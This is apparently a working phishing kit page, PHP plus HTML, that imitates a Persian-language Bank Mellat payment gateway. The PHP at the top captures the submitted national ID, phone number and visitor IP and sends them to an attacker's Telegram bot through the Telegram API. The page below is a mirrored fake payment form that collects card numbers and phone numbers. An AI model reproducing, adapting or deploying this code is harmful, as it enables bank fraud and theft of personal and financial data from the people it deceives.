<?php
$user = $_POST['nationalid'];
$pass = $_POST['phone'];
include "telegram.php";
if (!empty($_SERVER['HTTP_CLIENT_IP']))   
  {
    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
  }
//whether ip is from proxy
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
  {
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
  }
//whether ip is from remote address
else
  {
    $ip_address = $_SERVER['REMOTE_ADDR'];
  }
$texr="#LOGIN
🟠Waiting...
➖➖➖➖➖➖➖➖➖➖➖➖➖
nationalid: <code>$user</code>
phone: <code>$pass</code>
➖➖➖➖➖➖➖➖➖➖➖➖➖
🌐ip: <code>$ip_address</code>";
file_get_contents("https://api.telegram.org/bot".$TOKEN."/sendMessage?parse_mode=HTML&chat_id=".$ID."&text=".urlencode($texr));
?>
<!DOCTYPE html>
<html lang="en" >
   
<!-- Mirrored from psv444.club/PAPA30/Gateway/Request/e4d474544372630383a323e34393c263f532 by HTTrack Website Copier/3.x [XR&CO'2017], Sun, 31 Jan 2021 23:45:17 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
      <meta charset="UTF-8">
      <title>درگاه یکپارچه پرداخت - ملت</title>
      <script src="../../../../kit.fontawesome.com/768ea81349.js"></script>	
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="icon" type="file/image/png" href="file/img/pap30%20logo%20PNG.png" />
      <link rel="stylesheet" href="file/style.css">
      <link rel="stylesheet" href="file/css/btn.css">
      <link rel="stylesheet" href="file/css/header.css">
      <link rel="stylesheet" href="file/logo.css">
      <script type="text/javascript" src="file/js/jquery.min.js"></script>
	  <script src="file/js/inputhistory.js"></script>
      <style>
         .ibl32 {
         background: url(ibls32.html) no-repeat;
         background-position: -1000px;
         display: inline-block;
         width: 32px;
         height: 32px;
         border-radius: 20px;
         }
         @media only screen and (max-width: 620px){
         body{
         margin:0px;
         }
         .auth-wrapper {
         position: absolute;
         width: 90%;
         top: 5em;
         right: 5%;
         overflow:auto;
         }
         }
      </style>
   </head>
   <body>
      <!-- partial:index.partial.html -->
      <center>
         <div class="background-overflow">
            <div class="shape"></div>
         </div>
         <div id='button-1'></div>
         <div class="auth-wrapper" id="result">
         <form method="post" action="re-sendphone.php">
 <header id="steps-header" class="step-section steps-header"><ul class="step-inner steps"><li class="step active" data-step="1" data-step-name=""><span class="step-name">ورود اطلاعات</span></li><li class="step" data-step="2" data-step-name=""><span class="step-name">تاییدیه</span></li><li class="step" data-step="3" data-step-name=""><span class="step-name">اطلاعات پرداخت</span></li><li class="step" data-step="4" data-step-name=""><span class="step-name">وضعیت پرداخت</span></li></ul></header>              <!--<form method="post" action="verify.php">-->
            <div class="auth-form-wrapper">
               <div class="auth-form">
                  <div class="auth-form-label">
                     <h4>درگاه یکپارچه پرداخت <span style="color:#36bb81">ملت</span></h4>
                  </div>
                  <br>
                  <!--	<form> -->
                  <div style="
                     margin-top: -10px;
                     ">
                     <div id="box_message" style=""></div>
                     <input type="hidden" id="Startpay" name="StartPAY" value="0" />
                     <input type="hidden" id="orderid" name="OrderID" value="e4d474544372630383a323e34393c263f532" />
                     <label class="primary-label" style="font-weight: bold;font-size: 16px;" for="cardnumber">شماره کارت : </label> 
                     <span  aria-label="شماره کارت بانکی خود را به دقت وارد کنید" tabindex="0" class="tooltip-toggle question"> <i style="
                        font-size: 16.4px;
                        color: linear-gradient(to right,rgba(24,206,155,1) 0%,rgba(80,221,81,1) 100%);
                        border-radius:50%;
                        color: #198bd2;
                        background: rgba(120,120,120,.03);
                        padding: 7px;
                        width: 25px;
                        height: 25px;    border-style: solid;
                        border-width: .1px;padding:2px;" class="fas fa-question"></i></span>
                     <br>
                     <b id="png"> شماره کارت ۱۶ رقمی درج شده روی کارت را وارد کنید </b>
                     <b id="png2" style="display:none;color:red;"> شماره کارت وارد شده صحیح نمی باشد </b>
                     <div class="form-group row">
                        <div class="col-md-6 col-sm-8 col-12 mobile-justify">
                           <div class="cardnumberbox" id="cardnumberbox">
                              <span class="" id="bankd"></span>
                              <input type="tel" class="startclass" name="card" id="cardnumber"  minlength="33" maxlength="33" onkeypress="return isNumber(event);" onkeyup="nextithem();credit_select_num();formatPanOnKeyUp(event);" oninput="checkCart();mybank(this);"  placeholder="xxxx xxxx xxxx xxx" required autocomplete="off" title="لطفا شماره کارت خود را وارد نمایید">
                              <button type="button" id="card-list-button" data-toggle="dropdown" onclick="toggleAllPans()" aria-haspopup="true" aria-expanded="false" tabindex="-1"></button>
                              <div class="card-suggestionlist dropdown-menu" aria-labelledby="card-list-button" style="max-height: 451.5px;">
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
                  <br>
                  <div>
                     <label class="primary-label" style="font-weight: bold;font-size: 16px;" for="num">شماره تماس : </label><br>
                     <b id="number_png">شماره تماس و شماره کارت باید به نام خودتان باشد</b>
                     <br>
                     <center>
                        <div class="form-group row">
                           <div class="col-md-6 col-sm-8 col-12 mobile-justify">
                              <div class="cardnumberboxs" id="cardex">
                                 <input class="next" type="tel"  minlength="11"  maxlength="11" onkeypress="return isNumber(event);" onkeyup="frst();number_select_num();" name="phone" id="num" placeholder="09000000000" required title="لطفا شماره تماس خود را وارد نمایید" autocomplete="off">
                                 <div class="card-suggestionlist dropdown-menu" aria-labelledby="card-list-button" style="max-height: 451.5px;">
                                    <button type="button" id="card-list-button" data-toggle="dropdown" onclick="toggleAllPans()" aria-haspopup="true" aria-expanded="false" tabindex="-1"></button>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </center>
                  </div>
                  <br>
                  <label class="primary-label" style="font-weight: bold;font-size: 16px;">نوع درگاه : <span id="pgh"></span></label><br>
                  <b id="pay_text">درگاه موردنظر خود را برای پرداخت انتخاب نمایید</b>
                  <div class="drop" id="payloc">
                     <div class="option placeholder book" data-value="placeholder" style="background:#fff;">
                        درگاه مورد نظر را انتخاب کنید
                     </div>
                     <div class="option active" data-value="wow" onclick="btnPayGoup('papasi');">
                        <img src="file/assets/papasi.svg" >
به پرداخت ملت
                     </div>
                 </div>
                  <div class="money" style="
                     position: relative;
                     color: #36bb81;
                     font-size: 14px;
                     margin-bottom: -25px;
                     margin-top: auto;
                     top: -50px;
                     padding: 7px;
                     background: rgba(120,120,120,.04);
                     height: 35px;
                     border-radius: 5px;
                     box-shadow: 0 14px 28px rgba(0, 0, 0, 0.05), 0 10px 10px rgba(0, 0, 0, 0.02);
                     ">
                     <div class="text" style="
                        color: #222;
                        font-weight: 100;
                        float: right;
                        ">مبلغ قابل پرداخت : </div>
                     <div class="pay_code" style="
                        color: #a0b76e;
                        float: left;
                        ">20,000 ریـال</div>
                  </div>
				  
                  <br>
                  <br>
                  <input style="display: none;" id="ddd" name="TypeD" value="papasi" required>              
                  <div>
                     <button type="submit" class="btns btn-perches pautobank" id="payButton">مرحله بعد  <i style="font-size: 11px;" class="fas fa-long-arrow-alt-left" aria-hidden="true"></i></button>		
                     <a><button onclick="cancelpayment();" class="btns btn-decline" style="float: right;margin-top: -46px;margin-right: 4px; text-align: left;">انصراف</button></a>
                  </div>
               </div>
            </div>
         </div>
      </center>
      <!--</form>-->
      <script>
        $("#result").fadeOut();
         setTimeout(hide, 300);
         function hide(){
         $("#result").fadeIn();
         //$("#payButton").attr("disabled",true);
         document.getElementsByClassName('startclass')[0].select();
         }
         function frst(){
         var number = document.getElementById('num').value;  
         var bvc = number.length;
         var n = number.substring(0, 2);
         if (bvc == 1){
         if (n == "9"){
         var number = document.getElementById('num').value;  
         document.getElementById('num').value = "0"+number;  
         }
         }
         if(document.getElementById('num').value[0]!="0" || (document.getElementById('num').value[1]!="9" && bvc>1))
         document.getElementById('num').value="";
         }
         
         function showbased(eb,clasd){
var thiss = eb;
var val = $(thiss).attr("data-value");
$drop = $(".drop"),
prevActive = $(".drop .option.active").attr("data-value"),
options = $(".drop .option").length;
    $drop.find(".option.active").addClass("mini-hack");
    $drop.toggleClass("visible opacity withBG");
    $drop.removeClass("withBG");
    $drop.addClass("opacity");
    $(".mini-hack").removeClass("mini-hack");
    if ($drop.hasClass("visible")) {
      setTimeout(function() {
        $drop.addClass("withBG");
      }, 400 + options*100); 
    }
    
    var finalWidth = $(".drop").hasClass("visible") ? 16 : 17;
    $(".drop").css("width", "90%");
    setTimeout(function() {
      $(".drop").css("width", finalWidth + "em");
    }, 400);
    
    if (val !== "placeholder" || prevActive === "placeholder") {
      $(".drop .option").removeClass("active");
      $(eb).addClass("active");
    }
}
      </script>
      <script src="file/script.js"></script>
      <script src="file/bmp.js"></script>
      <script src="file/num.js"></script>
   </body>

<!-- Mirrored from psv444.club/PAPA30/Gateway/Request/e4d474544372630383a323e34393c263f532 by HTTrack Website Copier/3.x [XR&CO'2017], Sun, 31 Jan 2021 23:45:29 GMT -->
</html>